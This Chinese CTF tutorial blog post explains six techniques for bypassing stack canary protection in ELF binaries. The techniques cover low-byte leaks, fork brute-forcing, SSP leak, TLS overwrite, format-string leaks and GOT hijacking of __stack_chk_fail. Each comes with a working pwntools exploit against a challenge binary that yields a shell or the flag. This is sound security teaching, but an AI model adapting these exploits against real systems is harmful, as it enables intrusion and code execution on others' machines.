---
title: Canary保护的6种绕过姿势
date: 2021-01-20 22:19:09
tags: pwn
---

众所周知，CTF-pwn中的elf可执行程序存在以下几种保护措施：NX、PIE、RELRO、Canary<!--more-->
这篇文章讲Canary的保护的绕过姿势，目前学习到的方法有6种，其实这些东西我已经在线上线下讲过了3遍，但是一直很懒没有形成文字，今天特地写一下，意味着懒🐕了这么久的一个新开端吧

## Canary介绍  

```
Canary中文意译为金丝雀，来源于英国矿井工人用来探查井下气体是否有毒的金丝雀笼子。工人们每次下井都会带上一只金丝雀。如果井下的气体有毒，金丝雀由于对毒性敏感就会停止鸣叫甚至死亡，从而使工人们得到预警
```

那么，我们可以简单把它理解成一个类似于cookie之类的东西，程序执行时需要验证它是正确的才能正常向下执行
通常的栈溢出利用，需要覆盖返回地址以控制程序流，那么只需要在覆盖返回地址之前插入一个叫Canary的cookie信息，当函数返回之时检测Canary的值是否被更改，就可以判断是否发生了栈溢出这种危险行为，如果Canary被更改，程序会去执行__stack_chk_fail函数并结束。
一般来说，canary大部分情况都是在rbp-0x8的位置
![](1.png)
栈中的canary大概长这样
![](2.png)

## 覆盖低字节泄露Canary

有些存在溢出漏洞的程序，在要求我们输入字符后，会将我们输入的字符打印出来，而canary的最低位是\x00，是为了让canary可以截断输入的字符。我们可以利用溢出，多覆盖一个字节，将\x00给覆盖掉，那么canary就会和我们输入的字符连起来，那么，程序打印时没有检查打印字符的长度的话，就可以连带着Canary打印出来了，然后再次溢出，将泄露出的canary填入原来的位置，就可以覆盖到返回地址了

### 例题：攻防世界_厦门邀请赛pwn1

分析下代码
![](3.png)
存在栈溢出，canary在rbp-0x8的位置，可以将输入的字符串打印出来
那思路就很明确了
先通过多写1字节将\x00覆盖，然后打印泄露Canary，最后直接ROP
覆盖完大概长这样
![](4.png)

#### exp

```python
#!/usr/bin/env python
#coding=utf-8
from pwn import*
from LibcSearcher import *
context.log_level = 'debug'
context.terminal = ['terminator','-x','sh','-c']
binary = './babystack'
local = 1
if local == 1:
    p=process(binary)
else:
    p=remote("",)
elf=ELF(binary)
libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
pop_rdi_ret = 0x0000000000400a93
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
start = 0x0000000000400720
def exp():
    payload = "a"*0x88
    p.recvuntil(">> ")
    p.sendline("1")
    p.sendline(payload)
    p.recvuntil(">> ")
    p.sendline("2")
    p.recvuntil("a" * 0x88 + '\n')
    canary = u64(p.recv(7).rjust(8, '\x00'))
    log.success("canary==>" + hex(canary))
    payload = "a"*0x88 + p64(canary) + "a"*8 + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(start)
    p.recvuntil(">> ")
    p.sendline("1")
    p.sendline(payload)
    p.recvuntil(">> ")
    p.sendline("3")
    puts_addr = u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
    libc_base = puts_addr - libc.sym['puts']
    log.success("puts_addr==>" + hex(puts_addr))
    log.success("libc_base==>" + hex(libc_base))
    one_gadget = libc_base + 0xf1207
    payload = "a" * 0x88 + p64(canary) + "a"*8 + p64(one_gadget)
    p.recvuntil(">> ")
    p.sendline("1")
    p.send(payload)
    p.recvuntil(">> ")
    p.sendline("3")
    p.interactive()
exp()
```

## Fork子进程程序爆破canary

Fork函数创建子进程相当于复制一份当前进程，并且其中的内存布局以及变量等，包括canary都与父进程一致
那么每次程序挂了，都相当于会再重新开始一遍
那我们可以逐位爆破canary，如果程序挂了就说明这一位不对，如果程序正常就可以接着跑下一位，直到爆破出正确的canary

### 例题

这基本上都是直接从veritas👴👴的blog里摘出来的

```C++
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/wait.h>
void backdoor(void) {
    system("/bin/sh");
}
void init() {
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);
}
void vul(void) {
    char buffer[100];
    read(STDIN_FILENO, buffer, 120);
}
int main(void) {
    init();
	pid_t pid;
	while(1) {
		pid = fork();
		if(pid < 0) {
			puts("fork error");
			exit(0);
		}
		else if(pid == 0) {
			puts("welcome");
			vul();
			puts("recv sucess");
		}
		else {
			wait(0);
		}
	}
}
//gcc main.c -m32 -o bin
```

然后就硬爆破

#### exp

```python
from pwn import *
p = process('./bin')
elf = ELF("./bin")
p.recvuntil('welcome\n')
canary = '\x00'
for j in range(3):
    for i in range(0x100):
        p.send('a'*100 + canary + chr(i))
        a = p.recvuntil('welcome\n')
        if 'recv' in a:
            canary += chr(i)
            break

p.sendline('a'*100 + canary + 'a'*12 + p32(0x80485FB))
p.sendline("cat flag")
flag = p.recv()
p.close()
log.success('key is:' + flag)
#  [*] Stopped process './bin' (pid 17747)
#  [+] key is:flag{test}
```

## SSP(Stack Smashing Protect) Leak

这个方法不能getshell，但是可以通过触发canary时的报错信息，来打印出我们想要的内存中的值，例如flag
触发canary时会去执行_stack_chk_fail函数，执行这个函数时，会在屏幕上打印这么一段信息
![](7.png)
我们分析下\_\_stack_chk_fail的源码
![](5.png)
他会调用一个\_\_fortify_fail函数并传入"stack smashing detected"字符串
我们接着分析\_\_fortify_fail函数
![](6.png)
此处，第一个%s的参数是msg，第二个参数需要判断，如果msg!=NULL，就打印__libc_argv[0]，否则打印"\<unknown>"，而argv[0]存储的就是程序名，且这个参数存于栈上，我们只要修改栈上的argv[0]指针为flag的地址，就可以打印出flag

### 例题：wdb2018_guess

分析main函数

```C++
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  __WAIT_STATUS stat_loc; // [rsp+14h] [rbp-8Ch]
  int v5; // [rsp+1Ch] [rbp-84h]
  __int64 v6; // [rsp+20h] [rbp-80h]
  __int64 v7; // [rsp+28h] [rbp-78h]
  char buf[48]; // [rsp+30h] [rbp-70h]
  char s2[56]; // [rsp+60h] [rbp-40h]
  unsigned __int64 v10; // [rsp+98h] [rbp-8h]

  v10 = __readfsqword(0x28u);
  v7 = 3LL;
  LODWORD(stat_loc.__uptr) = 0;
  v6 = 0LL;
  sub_4009A6();
  HIDWORD(stat_loc.__iptr) = open("./flag.txt", 0, a2);
  if ( HIDWORD(stat_loc.__iptr) == -1 )
  {
    perror("./flag.txt");
    _exit(-1);
  }
  read(SHIDWORD(stat_loc.__iptr), buf, 0x30uLL);
  close(SHIDWORD(stat_loc.__iptr));
  puts("This is GUESS FLAG CHALLENGE!");
  while ( 1 )
  {
    if ( v6 >= v7 )
    {
      puts("you have no sense... bye :-) ");
      return 0LL;
    }
    v5 = sub_400A11();
    if ( !v5 )
      break;
    ++v6;
    wait((__WAIT_STATUS)&stat_loc);
  }
  puts("Please type your guessing flag");
  gets(s2);
  if ( !strcmp(buf, s2) )
    puts("You must have great six sense!!!! :-o ");
  else
    puts("You should take more effort to get six sence, and one more challenge!!");
  return 0LL;
}
```

sub_400A11函数

```C++
__int64 sub_400A11()
{
  unsigned int v1; // [rsp+Ch] [rbp-4h]

  v1 = fork();
  if ( v1 == -1 )
    err(1, "can not fork");
  return v1;
}
```

可以看到，fork了一个子进程，并且判断依据是v7的大小，也就是说整个程序可以崩溃3次
这姿势和题目我专门写了一篇，思路可以直接看[stack smash](https://n0vice.top/2020/04/09/Stack-smash/)

#### exp

```python
#!/usr/bin/env python
#coding=utf-8
from pwn import*
import sys
#context.log_level = 'debug'
context.terminal = ['terminator','-x','sh','-c']
binary = './pwn1' 
local = 1
if local == 1:
    p=process(binary)
else:
    p=remote("",)
elf=ELF(binary)
libc=elf.libc
def exp():
    p.recvuntil("flag\n")
    payload = "a"*296 + p64(elf.got['puts'])
    p.sendline(payload)
    p.recvuntil("*** stack smashing detected ***: ")
    puts_addr = u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
    libc_base = puts_addr - libc.sym['puts']
    log.success("puts_addr==>" + hex(puts_addr))
    log.success("libc_base==>" + hex(libc_base))
    environ = libc_base + libc.sym['environ']
    p.recvuntil("flag\n")
    payload = "a"*296 + p64(environ)
    p.sendline(payload)
    p.recvuntil("*** stack smashing detected ***: ")
    stack_addr = u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
    log.success("stack_addr==>" + hex(stack_addr))
    flag = stack_addr - 0x168
    p.recvuntil("flag\n")
    payload = "a"*296 + p64(flag)
    p.sendline(payload)
    p.interactive()
exp()
```

#### warn

需要注意的是，这个方法在glibc2.27及以上的版本中已失效
我们继续分析2.27的源码
![](8.png)
![](9.png)
可以看到，执行__fortify_fail_abort函数时多传入了一个need_backtrace参数，而整个参数在前面就已经写死成false了，所以执行\_\_libc_message函数时，第二个参数也被写死成了"\<unknown>"字符串，打印不了栈中的信息了

## 修改TLS结构体

我们首先需要知道canary是从**哪里**被取出来的
随便查看一个64位的程序，可以看到是从fs指向的位置加上0x28偏移的位置取出来的
而初始化canary时，fs寄存器指向的位置就是TLS结构体
![](11.png)
这个被定义在glibc/sysdeps/x86_64/nptl/tls.h中结构体tcbhead_t就是用来描述TLS的
![](12.png)
![](13.png)
以上是libc_start_main关于canary生成的过程，_dl_random是内核提供的随机数生成器
fs指向的位置加上0x28偏移处的变量uintptr_t stack_chk_guard就是canary的值

### 例题：*CTF2018 babystack

分析代码
![](14.png)
![](15.png)
程序在main函数中创建了一个子线程，并在其中调用栈溢出函数，首先输入size，然后读入size大小的字符
在多线程中TLS将被放置在多线程的栈的顶部，因此我们能直接通过栈溢出对canary初始值进行更改

#### 调试过程

断点在main函数，查看canary的地址，只能发现stack和tls结构体中两个canary的值
![](16.png)
再断点到线程函数，搜索canary，会发现tls被初始化了，就是多线程函数在libc上方mmap一段空间用来开辟了一个新的tls结构
![](18.png)
![](17.png)
并且这个tls结构除了canary其他都没有用，这段空间里面的数据都是随便可写的
我们可以gdb.attach给canary前的变量断点，然后continue，如果打通了，说明没有遇到断点，即在子线程中canary之前的变量与需要用到的系统调用无关
但是需要注意，在canary之前的那几个变量，在正常程序中与系统调用有关，不能直接改写，一般利用数组越界来跳过他们去改写canary
i春秋公益CTF_BFnote这题就是利用数组越界跳过它们去改写canary
在内存里大概长这样
![](19.png)

#### 整体思路

①触发栈溢出，将Canary覆盖为aaaaaaaa，同时使用超长的payload将TLS中的Canary一并覆盖为aaaaaaaa
②栈迁移到bss段
③ROP

#### exp

```python
from pwn import *
p=process("./bs")
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
context.terminal = ['terminator', '-x', 'sh', '-c']

pop_rdi_ret = 0x400c03
pop_rsi_r15 = 0x400c01
read_plt=0x4007e0
puts_got=0x601fb0
put_plt=0x4007c0
buf=0x602f00
leave_ret=0x400955

payload = p64(pop_rdi_ret)+p64(puts_got)+p64(put_plt)
payload += p64(pop_rdi_ret)+p64(0)+p64(pop_rsi_r15)+p64(buf+0x8)+p64(0)+p64(read_plt)+p64(leave_ret)

print p.recvuntil("How many bytes do you want to send?")
p.sendline(str(6128))
p.send("a"*4112+p64(buf)+payload+"a"*(6128-4120-len(payload)))

puts_addr = u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
libc_base = puts_addr - libc.sym['puts']
log.success("puts_addr==>" + hex(puts_addr))
log.success("libc_base==>" + hex(libc_base))
system = libc_base+libc.sym['system']
binsh = libc_base+libc.search("/bin/sh").next()
log.success("system_addr==>" + hex(system))
log.success("binsh==>" + hex(binsh))

p.sendline(p64(pop_rdi_ret)+p64(binsh)+p64(system))
p.interactive()
```

## 格式化字符串leak canary

针对有格式化字符串漏洞的栈溢出程序，利用格式化字符串漏洞可以任意地址读写的特点，泄露出栈上的canary，并填入对应位置，然后利用栈溢出get shell  
这里我找了一个典型的例题，我们需要计算一下偏移，然后利用%p来泄露canary

### 例题：ASIS-CTF-Finals-2017 Mary_Morton

main函数
![](20.png)
有选项可以选
![](21.png)
选项2有格式化字符串漏洞
![](22.png)
选项1有栈溢出漏洞
![](23.png)
还有后门
![](24.png)
开了canary保护
意味着要么溢出去触发canary，要么只能利用一次格式化字符串漏洞读内存
我们首先确定到可控输入位于格式化字符串第几个参数
![](25.png)
尝试一番可以发现是第6个参数的位置
![](26.png)
然后计算出buf和canary之间的距离为0x90-0x8=0x88=136
这是个64位程序，8字节为一个单位，136/8=17，那么canary距离格式化字符串函数23（17+6）个参数的距离
可以利用%23$p来leak canary
![](27.png)
nice
接下来就把canary填入rbp-8的位置然后ret2text就彳亍了

#### exp

```python
from pwn import *
context.log_level = 'debug'
p = process('./Mary_Morton')
p.recvuntil('3. Exit the battle')
p.sendline('2')
p.sendline("%23$p")
p.recvuntil('0x')
canary = int(p.recv(16),16)
log.success("canary==>" + hex(canary))
system = 0x4008DA
payload = 'a'*0x88 + p64(canary) + p64(0xdeadbeef) + p64(system)
p.sendline('1')
p.sendline(payload)
p.interactive()
```

## 劫持__stack_chk_fail函数

改写\_\_stack_chk_fail@got，但前提是必须有一个可以向任意地址写的漏洞，例如说格式化字符串漏洞
这个方法适用于只能输入一次的程序，如果说可以利用多次的话就可以像上面一样直接泄露canary了

### 例题：[BJDCTF 2nd]r2t4

程序比较简单，分析下
![](28.png)
存在溢出存在格式化字符串漏洞有canary
![](29.png)
有后门
直接改写__stack_chk_fail@got为backdoor
这个题限制不多，可以直接用fmtstr_payload模块一把梭
当然也可以手动构造
但是我还没做手动构造打的（懒🐕

#### exp

```python
from pwn import*
context.log_level = 'debug'
p=remote("node3.buuoj.cn",28676)
#p = process("./r2t4")
elf = ELF("./r2t4")
libc = elf.libc
stack_check = 0x601018
flag_addr = 0x400626
payload = fmtstr_payload(6,{stack_check:flag_addr}).ljust(40,'a')
p.sendline(payload)
p.interactive()
```

以上就是我对于canary保护的绕过姿势的总结，可能还有我暂时没有涉及到的，也欢迎师傅们提点我一下，这篇博客也算是多天没学习以来的一个新开端吧
文中所有的例题和我做分享时的ppt已经上传[github](https://github.com/N0vice21/Bypass_canary_demo)

参考链接：
https://p1kk.github.io/2019/10/26/canary%E7%9A%84%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/canary/
https://veritas501.space/2017/04/28/%E8%AE%BAcanary%E7%9A%84%E5%87%A0%E7%A7%8D%E7%8E%A9%E6%B3%95/
https://ctf-wiki.org/pwn/linux/mitigation/canary/

